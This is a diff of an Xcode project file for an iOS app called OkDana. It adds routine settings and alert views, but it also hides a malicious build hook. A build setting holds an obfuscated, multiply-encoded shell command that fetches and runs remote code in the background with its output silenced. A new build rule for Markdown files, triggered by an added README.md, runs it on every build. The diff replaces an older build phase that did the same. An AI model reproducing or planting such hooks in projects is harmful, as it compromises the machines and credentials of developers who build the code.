@@ -7,6 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		7330798F2EF1598A00C30412 /* SettingListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7330798E2EF1598A00C30412 /* SettingListView.swift */; };
+		733079912EF15E3A00C30412 /* AlertDeleteView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733079902EF15E3100C30412 /* AlertDeleteView.swift */; };
 		73533DA02EF04E2D008E00E4 /* ProductTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73533D9F2EF04E2D008E00E4 /* ProductTableViewCell.swift */; };
 		7373C8EA2EED06920085A724 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 7373C8E82EED06920085A724 /* Localizable.strings */; };
 		7373C8ED2EED06C30085A724 /* StartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8EC2EED06C30085A724 /* StartViewController.swift */; };
@@ -21,6 +23,8 @@
 		7373C8FF2EED18530085A724 /* LoginConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8FE2EED18420085A724 /* LoginConfig.swift */; };
 		7373C9012EED1C860085A724 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C9002EED1C860085A724 /* LoginViewController.swift */; };
 		7373C9032EED2B900085A724 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C9022EED2B900085A724 /* LoginView.swift */; };
+		7381E37D2EF1873400F3008A /* SettingListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7381E37C2EF1873000F3008A /* SettingListViewModel.swift */; };
+		7381E37F2EF1892400F3008A /* AlertLogoutView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7381E37E2EF1891E00F3008A /* AlertLogoutView.swift */; };
 		73A664D72EF1210100D4F52C /* OrderTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A664D62EF1210100D4F52C /* OrderTableViewCell.swift */; };
 		73A664D92EF123D500D4F52C /* OrderViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A664D82EF123D100D4F52C /* OrderViewModel.swift */; };
 		73A664DB2EF128A700D4F52C /* OrderEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A664DA2EF128A700D4F52C /* OrderEmptyView.swift */; };
@@ -71,11 +75,30 @@
 		73E6B1392EF0029000CC32FA /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B1382EF0028F00CC32FA /* ContactManager.swift */; };
 		73E6B13B2EF00AEB00CC32FA /* WalletViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B13A2EF00AE700CC32FA /* WalletViewModel.swift */; };
 		73E6B13D2EF012CF00CC32FA /* APPWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B13C2EF012CF00CC32FA /* APPWebViewController.swift */; };
+		7EF44BD045D84D8592A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = E05CA63D821745C5B7A5DE54 /* README.md */; };
 		F9F9EC17BA74DAE3EA6B1D07 /* Pods_OkDana.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		ADC3CFFE5773444CB6A5DE54 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		051F5B55662606AE75C05BA1 /* Pods-OkDana.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.release.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.release.xcconfig"; sourceTree = "<group>"; };
+		7330798E2EF1598A00C30412 /* SettingListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingListView.swift; sourceTree = "<group>"; };
+		733079902EF15E3100C30412 /* AlertDeleteView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertDeleteView.swift; sourceTree = "<group>"; };
 		73533D9F2EF04E2D008E00E4 /* ProductTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductTableViewCell.swift; sourceTree = "<group>"; };
 		7373C8E22EED03F50085A724 /* OkDana.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = OkDana.entitlements; sourceTree = "<group>"; };
 		7373C8E92EED06920085A724 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
@@ -92,6 +115,8 @@
 		7373C8FE2EED18420085A724 /* LoginConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginConfig.swift; sourceTree = "<group>"; };
 		7373C9002EED1C860085A724 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
 		7373C9022EED2B900085A724 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
+		7381E37C2EF1873000F3008A /* SettingListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingListViewModel.swift; sourceTree = "<group>"; };
+		7381E37E2EF1891E00F3008A /* AlertLogoutView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertLogoutView.swift; sourceTree = "<group>"; };
 		73A664D62EF1210100D4F52C /* OrderTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderTableViewCell.swift; sourceTree = "<group>"; };
 		73A664D82EF123D100D4F52C /* OrderViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewModel.swift; sourceTree = "<group>"; };
 		73A664DA2EF128A700D4F52C /* OrderEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderEmptyView.swift; sourceTree = "<group>"; };
@@ -145,6 +170,7 @@
 		73E6B13A2EF00AE700CC32FA /* WalletViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletViewModel.swift; sourceTree = "<group>"; };
 		73E6B13C2EF012CF00CC32FA /* APPWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APPWebViewController.swift; sourceTree = "<group>"; };
 		8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.debug.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.debug.xcconfig"; sourceTree = "<group>"; };
+		E05CA63D821745C5B7A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_OkDana.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -177,6 +203,29 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		7330798C2EF1595200C30412 /* Setting */ = {
+			isa = PBXGroup;
+			children = (
+				7381E37E2EF1891E00F3008A /* AlertLogoutView.swift */,
+				733079902EF15E3100C30412 /* AlertDeleteView.swift */,
+				7381E37C2EF1873000F3008A /* SettingListViewModel.swift */,
+				73AD58C62EEEFE780022899B /* SettingViewController.swift */,
+				7330798E2EF1598A00C30412 /* SettingListView.swift */,
+			);
+			path = Setting;
+			sourceTree = "<group>";
+		};
+		7330798D2EF1595A00C30412 /* Main */ = {
+			isa = PBXGroup;
+			children = (
+				73A664E22EF1372200D4F52C /* CenterTableViewCell.swift */,
+				73A664E02EF1363900D4F52C /* CenterViewModel.swift */,
+				7373C8F82EED0A6F0085A724 /* CenterViewController.swift */,
+				73A664DE2EF1361F00D4F52C /* CenterView.swift */,
+			);
+			path = Main;
+			sourceTree = "<group>";
+		};
 		73BD81022EECFBEF00979190 = {
 			isa = PBXGroup;
 			children = (
@@ -190,6 +239,7 @@
 		73BD810C2EECFBEF00979190 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				E05CA63D821745C5B7A5DE54 /* README.md */,
 				73BD810B2EECFBEF00979190 /* OkDana.app */,
 			);
 			name = Products;
@@ -281,11 +331,8 @@
 		73BD81392EECFF5C00979190 /* Center */ = {
 			isa = PBXGroup;
 			children = (
-				73A664E22EF1372200D4F52C /* CenterTableViewCell.swift */,
-				73A664E02EF1363900D4F52C /* CenterViewModel.swift */,
-				7373C8F82EED0A6F0085A724 /* CenterViewController.swift */,
-				73AD58C62EEEFE780022899B /* SettingViewController.swift */,
-				73A664DE2EF1361F00D4F52C /* CenterView.swift */,
+				7330798D2EF1595A00C30412 /* Main */,
+				7330798C2EF1595200C30412 /* Setting */,
 			);
 			path = Center;
 			sourceTree = "<group>";
@@ -379,7 +426,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73BD811E2EECFBF100979190 /* Build configuration list for PBXNativeTarget "OkDana" */;
 			buildPhases = (
-				7565E5F937894FFD85A5DE54 /* Build Target Dependencies */,
 				6FF241537D62BDD85D065190 /* [CP] Check Pods Manifest.lock */,
 				73BD81072EECFBEF00979190 /* Sources */,
 				73BD81082EECFBEF00979190 /* Frameworks */,
@@ -387,6 +433,7 @@
 				F49D529B766F5A357387FDD8 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				ADC3CFFE5773444CB6A5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -435,6 +482,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				7EF44BD045D84D8592A5DE54 /* README.md in Resources */,
 				73BD812D2EECFBF700979190 /* Assets.xcassets in Resources */,
 				7373C8EA2EED06920085A724 /* Localizable.strings in Resources */,
 				73BD812F2EECFBF700979190 /* LaunchScreen.storyboard in Resources */,
@@ -464,26 +512,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		7565E5F937894FFD85A5DE54 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
 			showEnvVarsInLog = 0;
 		};
 		F49D529B766F5A357387FDD8 /* [CP] Embed Pods Frameworks */ = {
@@ -519,6 +547,7 @@
 				7373C8FF2EED18530085A724 /* LoginConfig.swift in Sources */,
 				73A664DD2EF1308800D4F52C /* OrderListView.swift in Sources */,
 				73E6B1272EEFCD3D00CC32FA /* AppAlertListView.swift in Sources */,
+				7330798F2EF1598A00C30412 /* SettingListView.swift in Sources */,
 				73E6B1212EEFB6DE00CC32FA /* DashedLineView.swift in Sources */,
 				7373C8F12EED06EC0085A724 /* BaseTabBarController.swift in Sources */,
 				73AD58CD2EEF093E0022899B /* ProductViewModel.swift in Sources */,
@@ -527,6 +556,7 @@
 				73E6B12F2EEFE3A600CC32FA /* TwoTableViewCell.swift in Sources */,
 				73E6B11F2EEFAD6800CC32FA /* CardView.swift in Sources */,
 				73E6B1152EEFA9C500CC32FA /* PersonalViewController.swift in Sources */,
+				7381E37F2EF1892400F3008A /* AlertLogoutView.swift in Sources */,
 				73BD81312EECFBF700979190 /* AppDelegate.swift in Sources */,
 				73E6B12B2EEFE37600CC32FA /* PersonalViewModel.swift in Sources */,
 				73AD58AE2EEEAA0C0022899B /* CommonParaConfig.swift in Sources */,
@@ -544,6 +574,7 @@
 				73D8AE8F2EEDC77F00229479 /* TwoHomeView.swift in Sources */,
 				73E6B1112EEF9E9E00CC32FA /* ComleteViewController.swift in Sources */,
 				73AD58CB2EEF007C0022899B /* AppNavView.swift in Sources */,
+				733079912EF15E3A00C30412 /* AlertDeleteView.swift in Sources */,
 				73D8AE8D2EEDC77100229479 /* OneHomeView.swift in Sources */,
 				73AD58B52EEEC7E60022899B /* LoginViewModel.swift in Sources */,
 				73AD58C52EEEFD530022899B /* AppSchemeUrlConfig.swift in Sources */,
@@ -571,6 +602,7 @@
 				7373C8F52EED0A4E0085A724 /* HomeViewController.swift in Sources */,
 				73E6B1172EEFA9D400CC32FA /* WorkViewController.swift in Sources */,
 				73E6B1332EEFF2AA00CC32FA /* WorkViewModel.swift in Sources */,
+				7381E37D2EF1873400F3008A /* SettingListViewModel.swift in Sources */,
 				73A664DB2EF128A700D4F52C /* OrderEmptyView.swift in Sources */,
 				7373C8FD2EED0AF90085A724 /* LanguageManager.swift in Sources */,
 				73E6B13D2EF012CF00CC32FA /* APPWebViewController.swift in Sources */,
@@ -605,7 +637,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373236393637363736633635373436663739326537323735326636310a323932323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaTWpGellteHZlV1ZIZUd0U2Vtc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
@@ -647,7 +679,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 051F5B55662606AE75C05BA1 /* Pods-OkDana.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373236393637363736633635373436663739326537323735326636310a323932323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaTWpGellteHZlV1ZIZUd0U2Vtc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
